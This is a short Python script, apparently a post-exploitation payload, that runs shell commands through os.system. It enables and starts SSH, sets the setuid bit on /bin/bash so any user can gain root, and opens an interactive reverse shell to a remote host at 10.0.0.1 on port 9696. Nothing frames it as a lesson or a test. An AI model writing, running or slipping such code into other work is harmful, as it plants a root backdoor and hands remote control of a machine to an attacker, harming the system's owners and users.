import os
run=os.system
run("systemctl enable ssh")
run("systemctl start ssh")
run("chmod +s /bin/bash")
run("bash -i >& /dev/tcp/10.0.0.1/9696 0>&1")

